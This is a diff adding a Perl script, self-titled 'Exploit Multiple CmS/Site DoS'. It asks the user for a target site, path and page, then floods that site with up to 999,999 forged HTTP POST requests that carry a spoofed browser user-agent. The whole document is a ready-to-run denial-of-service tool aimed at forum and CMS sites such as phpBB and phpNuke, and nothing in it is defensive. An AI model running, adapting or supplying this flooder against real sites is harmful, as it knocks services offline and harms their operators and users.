@@ -1,0 +1,87 @@
+
+
+use IO::Socket;
+
+
+$x = 0;
+
+print q(
+Exploit Multiple CmS/Site DoS
+);
+
+print q(
+° Write The Url You Want To DoS Without The Path! - Example : www.target.com
+° Url: );
+$host = <STDIN>;
+chop ($host);
+
+print q(
+° Write The The Path! - Example : /, /phpBB2/, /forum/, /phpnuke/, ecc...
+° Path: );
+$path = <STDIN>;
+chop ($path);
+
+print q(
+° Write The Page Or The Action With You Want Flooding Or DoS !
+° Like : index.php, modules.php?name=Forums, index.php?cmd=CreateAdmin
+° Page/Action: );
+$page = <STDIN>;
+chop ($page);
+
+print q(
+° Type the command " flood " for starting : 
+° Command: );
+$type = <STDIN>;
+chop ($type);
+
+if($type == 1){
+
+while($x != 0000)
+{
+
+$x++;
+}
+
+}
+elsif ($type == flood){
+
+while($x != 999999)
+{
+
+$postit = "$host"."$path"."$page";
+
+$lrg = length $postit;
+
+
+my $sock = new IO::Socket::INET (
+                                 PeerAddr => "$host",
+                                 PeerPort => "80",
+                                 Proto => "tcp",
+                                );
+
+die "\nConnection Refused : $!\n" unless $sock;
+
+print $sock "POST $path"."$page"." HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\n";
+print $sock "Referer: $host\n";
+print $sock "Accept-Language: en-us\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n";
+print $sock "Content-Length: $lrg\n\n";
+print $sock "$postit\n";
+close($sock);
+
+
+syswrite STDOUT, "->";
+
+
+$x++;
+}
+}else{
+
+   die "
+Error !
+
+\n";
+}
